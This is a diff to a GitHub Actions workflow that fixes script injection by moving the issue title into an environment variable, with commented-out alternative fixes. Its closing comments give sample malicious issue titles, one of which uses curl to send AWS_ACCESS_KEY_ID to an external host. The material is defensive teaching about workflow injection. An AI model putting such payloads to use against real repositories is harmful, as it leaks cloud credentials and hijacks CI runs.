@@ -8,10 +8,50 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Assign label
+        env:
+          TITLE: ${{ github.event.issue.title }}
         run: |
-          issue_title="${{ github.event.issue.title }}"
-          if [[ "$issue_title" == *"bug"* ]]; then
+          # issue_title="${{ github.event.issue.title }}"
+          # if [[ "$issue_title" == *"bug"* ]]; then
+          if [[ "$TITLE" == *"bug"* ]]; then
           echo "Issue is about a bug!"
           else
           echo "Issue is not about a bug"
           fi
+
+
+# SOLUTION #1:
+  # - use custom action to assign label
+# jobs:
+#   assign-label:
+#     runs-on: ubuntu-latest
+#     steps:
+#       - name: Assign label
+#         uses: ...
+#         run: |
+#           issue_title="${{ github.event.issue.title }}"
+#           if [[ "$issue_title" == *"bug"* ]]; then
+#           echo "Issue is about a bug!"
+#           else
+#           echo "Issue is not about a bug"
+#           fi
+
+# SOLUTION #2:
+ # - use ENV variables to pass the issue title
+# jobs:
+#   assign-label:
+#     runs-on: ubuntu-latest
+#     steps:
+#       - name: Assign label
+#         env:
+#           ISSUE_TITLE: ${{ github.event.issue.title }}
+#         run: |
+#           if [[ "$ISSUE_TITLE" == *"bug"* ]]; then
+#           echo "Issue is about a bug!"
+#           else
+#           echo "Issue is not about a bug"
+#           fi
+
+
+# a";echo Got your secret"    # This is not that much harmful, but it shows how script injection can be used to manipulate the workflow.
+# a";curl http://example.com?abc=$AWS_ACCESS_KEY_ID"    # This going to leak the AWS_ACCESS_KEY_ID to an external server.
